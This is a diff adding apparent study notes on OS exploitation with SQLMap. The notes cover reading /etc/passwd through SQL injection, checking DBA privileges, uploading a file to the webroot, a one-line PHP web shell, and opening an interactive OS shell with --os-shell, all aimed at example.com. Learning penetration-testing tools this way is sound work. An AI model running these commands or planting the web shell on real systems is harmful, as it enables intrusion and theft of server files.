@@ -171,3 +171,64 @@ You can filter data based on `conditional statements`:
 This will extract `binary data`:  
 * `--binary-fields="[Enter field/column]"` tells SQLMap to treat the specified field as binary data, allowing it to extract and handle that field accordingly
 > sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --binary-fields="digest"
+
+## OS Exploitation with SQLMap
+
+### 1. **File Read/Write**
+- **Goal**: Utilize SQL Injection to read and write files on the hosting server.
+- **File Reading**: Common, requires DB user privileges like `LOAD DATA` and `INSERT` to read local files (e.g., `/etc/passwd`).
+  - Example command:  
+    `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`
+- **Privileges**: DBA privileges are not always required, but helpful. Without DBA access, file reading can be blocked.
+- **Check for DBA Privileges**: Use `--is-dba` option in SQLMap.
+  - Example:
+    ```bash
+    sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+    ```
+
+### 2. **Reading Local Files**
+- **SQLMap Command**: Use `--file-read` to read files from the server.
+  - Example:
+    ```bash
+    sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+    ```
+- **Output**: SQLMap saves the file locally, confirming successful file retrieval.
+  - Example:
+    ```bash
+    cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
+    ```
+
+### 3. **Writing Local Files**
+- **File Writing**: More restricted in modern DBMS to prevent web shell uploads.
+  - Requires DBA privileges or specific settings like `--secure-file-priv` disabled.
+- **Test File Writing**: Use `--file-write` and `--file-dest` options to upload files.
+  - Example:
+    ```bash
+    sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+    ```
+- **PHP Shell**: Create a basic PHP web shell (`<?php system($_GET["cmd"]); ?>`) to get command execution.
+
+### 4. **OS Command Execution**
+- **OS Shell via SQLMap**: Use `--os-shell` to gain command execution on the server.
+  - Example:
+    ```bash
+    sqlmap -u "http://www.example.com/?id=1" --os-shell
+    ```
+- **SQLMap’s Functionality**: Uses techniques like UDFs (User Defined Functions) to execute OS commands remotely.
+
+### 5. **Server Webroot Discovery**
+- **Finding Webroot**: If unknown, SQLMap can automatically attempt to find the server's webroot.
+  - **Method**: Use a default list of common locations (`/var/www/`, `/var/www/html/`) or brute-force search.
+  - SQLMap will ask for confirmation when it finds the webroot, or you can specify a custom location.
+
+### 6. **Interactive OS Shell**
+- **Interactive Mode**: Once the shell is active, you can interact with the remote server, e.g., running `ls -la` to list files.
+  - Example:
+    ```bash
+    os-shell> ls -la
+    ```
+
+### 7. **Notes**
+- SQLMap can utilize different methods to exploit SQL injection vulnerabilities and interact with the OS.
+- Modern DBMSs restrict file-write operations to avoid unauthorized access, but file-read operations are often feasible when privileges are granted.
+- Automatic webroot discovery helps in targeting common server paths when writing files.
